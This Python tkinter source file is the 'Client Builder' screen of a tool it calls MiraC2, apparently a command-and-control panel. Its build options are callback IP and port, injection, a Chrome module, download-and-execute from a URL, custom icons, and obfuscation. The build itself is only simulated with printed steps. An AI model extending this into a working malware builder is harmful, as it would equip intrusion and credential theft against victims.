"""
Builder widget for creating client executables
"""

import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from typing import Dict, Any
import threading
import time

class BuilderWidget:
    """Widget for building client executables"""
    
    def __init__(self, parent, config: Dict[str, Any], backend_client):
        self.parent = parent
        self.config = config
        self.backend_client = backend_client
        self.building = False
        
        self._create_interface()
    
    def _create_interface(self):
        """Create the builder interface"""
        # Main container
        main_frame = ttk.Frame(self.parent)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Header
        header_frame = ttk.Frame(main_frame, style='Card.TFrame')
        header_frame.pack(fill=tk.X, pady=(0, 10))
        
        title_label = ttk.Label(header_frame, 
                              text="🔧 Client Builder",
                              style='Header.TLabel')
        title_label.pack(side=tk.LEFT, padx=20, pady=15)
        
        # Build configuration
        config_frame = ttk.Frame(main_frame, style='Card.TFrame')
        config_frame.pack(fill=tk.X, pady=(0, 10))
        
        config_title = ttk.Label(config_frame, 
                                text="⚙️ Build Configuration",
                                style='Header.TLabel')
        config_title.pack(anchor='w', padx=20, pady=(15, 10))
        
        # Configuration form
        form_frame = ttk.Frame(config_frame)
        form_frame.pack(fill=tk.X, padx=20, pady=(0, 15))
        
        # IP and Port
        network_frame = ttk.Frame(form_frame)
        network_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(network_frame, text="Server IP:").pack(side=tk.LEFT)
        self.ip_var = tk.StringVar(value="127.0.0.1")
        ip_entry = ttk.Entry(network_frame, textvariable=self.ip_var, width=15)
        ip_entry.pack(side=tk.LEFT, padx=(10, 20))
        
        ttk.Label(network_frame, text="Port:").pack(side=tk.LEFT)
        self.port_var = tk.StringVar(value="8080")
        port_entry = ttk.Entry(network_frame, textvariable=self.port_var, width=10)
        port_entry.pack(side=tk.LEFT, padx=(10, 0))
        
        # Options
        options_frame = ttk.Frame(form_frame)
        options_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.injection_var = tk.BooleanVar()
        injection_check = ttk.Checkbutton(options_frame,
                                        text="Enable Injection",
                                        variable=self.injection_var)
        injection_check.pack(side=tk.LEFT, padx=(0, 20))
        
        self.chrome_var = tk.BooleanVar(value=True)
        chrome_check = ttk.Checkbutton(options_frame,
                                     text="Chrome Module",
                                     variable=self.chrome_var)
        chrome_check.pack(side=tk.LEFT, padx=(0, 20))
        
        self.download_exec_var = tk.BooleanVar()
        download_check = ttk.Checkbutton(options_frame,
                                       text="Download & Execute",
                                       variable=self.download_exec_var,
                                       command=self._toggle_download_url)
        download_check.pack(side=tk.LEFT)
        
        # Download URL
        self.url_frame = ttk.Frame(form_frame)
        self.url_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(self.url_frame, text="Download URL:").pack(side=tk.LEFT)
        self.url_var = tk.StringVar()
        self.url_entry = ttk.Entry(self.url_frame, textvariable=self.url_var, width=50, state='disabled')
        self.url_entry.pack(side=tk.LEFT, padx=(10, 0))
        
        # Icon selection
        icon_frame = ttk.Frame(form_frame)
        icon_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.custom_icon_var = tk.BooleanVar()
        icon_check = ttk.Checkbutton(icon_frame,
                                   text="Custom Icon:",
                                   variable=self.custom_icon_var,
                                   command=self._toggle_icon_selection)
        icon_check.pack(side=tk.LEFT)
        
        self.icon_path_var = tk.StringVar()
        self.icon_entry = ttk.Entry(icon_frame, textvariable=self.icon_path_var, width=40, state='disabled')
        self.icon_entry.pack(side=tk.LEFT, padx=(10, 5))
        
        self.icon_button = ttk.Button(icon_frame,
                                    text="Browse",
                                    command=self._browse_icon,
                                    state='disabled')
        self.icon_button.pack(side=tk.LEFT)
        
        # Build button
        build_button_frame = ttk.Frame(form_frame)
        build_button_frame.pack(fill=tk.X, pady=(20, 0))
        
        self.build_button = ttk.Button(build_button_frame,
                                     text="🚀 Build Client",
                                     style='Primary.TButton',
                                     command=self._start_build)
        self.build_button.pack(side=tk.LEFT)
        
        self.progress_var = tk.StringVar(value="Ready to build")
        progress_label = ttk.Label(build_button_frame, textvariable=self.progress_var)
        progress_label.pack(side=tk.LEFT, padx=(20, 0))
        
        # Build output
        output_frame = ttk.Frame(main_frame, style='Card.TFrame')
        output_frame.pack(fill=tk.BOTH, expand=True)
        
        output_title = ttk.Label(output_frame, 
                               text="📋 Build Output",
                               style='Header.TLabel')
        output_title.pack(anchor='w', padx=20, pady=(15, 10))
        
        # Output text widget
        text_frame = ttk.Frame(output_frame)
        text_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=(0, 15))
        
        self.output_text = tk.Text(text_frame,
                                 bg='#000000',
                                 fg='#00ff41',  # Green text
                                 insertbackground='#ff0040',  # Red cursor
                                 font=('Consolas', 10),
                                 wrap=tk.WORD,
                                 state=tk.DISABLED)
        
        output_scrollbar = ttk.Scrollbar(text_frame, orient=tk.VERTICAL, command=self.output_text.yview)
        self.output_text.configure(yscrollcommand=output_scrollbar.set)
        
        # Pack output widgets
        output_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.output_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Configure text tags
        self.output_text.tag_configure("success", foreground="#00ff41")  # Green
        self.output_text.tag_configure("error", foreground="#ff0040")    # Red
        self.output_text.tag_configure("warning", foreground="#ffaa00")  # Orange
        self.output_text.tag_configure("info", foreground="#ffffff")     # White
        
        self._add_welcome_message()
    
    def _add_welcome_message(self):
        """Add welcome message to output"""
        messages = [
            "🔧 MiraC2 Client Builder",
            "═" * 50,
            "Ready to build custom clients",
            "Configure settings above and click 'Build Client'",
            ""
        ]
        
        for message in messages:
            self._add_output(message, "info")
    
    def _toggle_download_url(self):
        """Toggle download URL entry"""
        if self.download_exec_var.get():
            self.url_entry.config(state='normal')
        else:
            self.url_entry.config(state='disabled')
            self.url_var.set("")
    
    def _toggle_icon_selection(self):
        """Toggle icon selection"""
        if self.custom_icon_var.get():
            self.icon_entry.config(state='normal')
            self.icon_button.config(state='normal')
        else:
            self.icon_entry.config(state='disabled')
            self.icon_button.config(state='disabled')
            self.icon_path_var.set("")
    
    def _browse_icon(self):
        """Browse for icon file"""
        filename = filedialog.askopenfilename(
            title="Select Icon File",
            filetypes=[("Icon files", "*.ico"), ("All files", "*.*")]
        )
        if filename:
            self.icon_path_var.set(filename)
    
    def _start_build(self):
        """Start the build process"""
        if self.building:
            return
        
        # Validate inputs
        ip = self.ip_var.get().strip()
        port = self.port_var.get().strip()
        
        if not ip or not port:
            messagebox.showerror("Error", "IP and Port are required")
            return
        
        try:
            port_num = int(port)
            if port_num < 1 or port_num > 65535:
                raise ValueError()
        except ValueError:
            messagebox.showerror("Error", "Port must be a number between 1 and 65535")
            return
        
        if self.download_exec_var.get() and not self.url_var.get().strip():
            messagebox.showerror("Error", "Download URL is required when Download & Execute is enabled")
            return
        
        # Start build in separate thread
        self.building = True
        self.build_button.config(state='disabled')
        self.progress_var.set("Building...")
        
        build_thread = threading.Thread(target=self._build_process, daemon=True)
        build_thread.start()
    
    def _build_process(self):
        """Simulate build process"""
        try:
            # Clear output
            self.output_text.config(state=tk.NORMAL)
            self.output_text.delete(1.0, tk.END)
            self.output_text.config(state=tk.DISABLED)
            
            build_steps = [
                ("Validating configuration...", "info"),
                (f"✓ Server IP: {self.ip_var.get()}", "success"),
                (f"✓ Port: {self.port_var.get()}", "success"),
                (f"✓ Injection: {'Enabled' if self.injection_var.get() else 'Disabled'}", "success"),
                (f"✓ Chrome Module: {'Enabled' if self.chrome_var.get() else 'Disabled'}", "success"),
                ("", "info"),
                ("Starting build process...", "info"),
                ("Loading build templates...", "info"),
                ("Configuring connection settings...", "info"),
                ("Setting up payload modules...", "info"),
                ("Compiling executable...", "info"),
                ("Applying obfuscation...", "info"),
                ("Finalizing build...", "info"),
                ("", "info"),
                ("✅ BUILD SUCCESSFUL!", "success"),
                ("Output: ~/Desktop/mira_client_xxxxx.exe", "success"),
                (f"Build completed at {time.strftime('%H:%M:%S')}", "info")
            ]
            
            for step, msg_type in build_steps:
                self._add_output(step, msg_type)
                time.sleep(0.5)  # Simulate build time
                
                # Update progress
                if "✅" in step:
                    self.parent.after(0, lambda: self.progress_var.set("Build completed successfully!"))
                
        except Exception as e:
            self._add_output(f"❌ BUILD FAILED: {str(e)}", "error")
            self.parent.after(0, lambda: self.progress_var.set("Build failed"))
        
        finally:
            # Re-enable build button
            self.parent.after(0, self._build_finished)
    
    def _build_finished(self):
        """Called when build is finished"""
        self.building = False
        self.build_button.config(state='normal')
    
    def _add_output(self, message: str, msg_type: str = "info"):
        """Add message to output text"""
        def update_output():
            self.output_text.config(state=tk.NORMAL)
            self.output_text.insert(tk.END, f"{message}\n", msg_type)
            self.output_text.config(state=tk.DISABLED)
            self.output_text.see(tk.END)
        
        self.parent.after(0, update_output)